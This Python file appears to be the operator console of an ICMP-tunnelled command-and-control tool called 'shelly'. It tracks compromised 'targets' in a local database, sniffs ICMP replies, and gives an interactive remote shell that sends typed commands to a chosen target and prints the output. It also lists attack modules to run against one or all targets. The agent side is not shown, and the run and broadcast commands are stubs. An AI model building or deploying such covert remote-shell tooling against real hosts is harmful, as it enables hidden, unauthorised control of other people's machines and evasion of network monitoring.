#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from columnar import columnar
from tinydb import TinyDB, Query
import os
from termcolor import colored
import sys
import time
from shellyparser import ArgumentParser
import socket
import readline
from multiprocessing import Process, Manager

manager = Manager()
shell_lock = manager.Value(bool, False)

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')
        self.mock_stdout = ""


    def list_info(self):
        response = "\nTargets:\n"

        targets = self.db.all()
        targets = sorted(targets, key=lambda d: d['id'])

        headers = ['id', 'ip', 'status', 'location']
        data = []
        for target in targets:
            data.append([target['number'], target['ip'], target['status'], target['location']])
        response += columnar(data, headers)
        
        response += "\nModules:\n"
        headers = ['name', 'description']
        data = []
        for module in os.listdir('./modules'):
            with open(f"./modules/{module}","r") as file:
                for line in file.readlines():
                    if line.startswith("# DESCRIPTION:"):
                        desc = (line[14:]).strip()
            data.append([module.split('.')[0], desc])
        response += columnar(data, headers)
        
        return response
    
    def rm_target(self, target):
        Target = Query()
        try:
            self.db.remove(Target.number == target)[0]
            print(f"Removed target {target} from the database")
        except Exception:
            print(f"Failed to remove target {target}")

    def sniffing(self, target_ip):
        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")

    def filter_commands(self, cmd):
        cmd = cmd.split(" ")[0]
        if cmd in ("vim", "nano", "vi", "visudo", "watch", "emacs"):
            print(f"Command {cmd} is not valid as it requires an interactive shell")
            return True
        return False

    def interact(self, target):
        Target = Query()
        target = self.db.search(Target.number == target)[0]

        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            if not shell_lock.value:
                cmd = input(colored("shell > ", "red"))
                shell_lock.value = True
                if cmd == "exit":
                    sniffer.kill()
                    break
                elif len(cmd) != 0 and not self.filter_commands(cmd):
                    self.send(target['ip'], "instruction", cmd.encode())
                else:
                    shell_lock.value = False
        
    def instruction(self, shellpack):
        if shellpack['option'] == "TRUNCATED":
            print(shellpack['data'].decode(), end="")
        elif shellpack['option'] == "COMPLETE":
            print(shellpack['data'].decode())
            shell_lock.value = False
        elif shellpack['option'] == "ERROR":
            print(f"[ERROR] {shellpack['data'].decode()}")
            shell_lock.value = False
        else:
            print(f"{shellpack['data'].decode()}")
            shell_lock.value = False

def main():
    controller = Controller()
    parser = ArgumentParser(
                    prog='shelly.py')
    parser.add_argument('command', choices=["ls", "rm", "interact", "run", "broadcast"], help='The command to execute')
    parser.set_commands_help({
        'ls': '\tList connected targets',
        'rm': '\tRemove a target',
        'interact': 'Interact with a specified target using the ICMP shell',
        'run': '\tRuns an included module against a specified target or all targets',
        'broadcast': 'Broadcasts a message to all users on all targets',
        })

    module_names = [module.split(".")[0] for module in os.listdir('./modules')]

    parser.add_argument('-t', '--target', choices=[str(target['id']) for target in controller.db.all()].append("all"), help='The target to interact with/run modules on. Specifying \'all\' will select ALL targets.')  
    parser.add_argument('-m', '--module', choices=module_names, help='The module to use for the run command')  

    args = parser.parse_args()

    if args.command in ('interact', 'run') and (args.target is None):
        parser.error(f"The command {args.command} requires you to set a target with --target")

    match args.command:
        case "ls":
            print(controller.list_info())
        case "rm":
            controller.rm_target(int(args.target))
        case "interact":
            if args.target == "all":
                parser.error(f"The command {args.command} can only take one target")
            controller.interact(int(args.target))
        case "run":
            if (args.module is None):
                parser.error(f"The command {args.command} requires you to declare a module\nModules can be found by running shelly.py ls")
            print("Run!")
            #controller.run()
        case "broadcast":
            print("Broadcast")

if __name__ == "__main__":
    main()

            
    
    
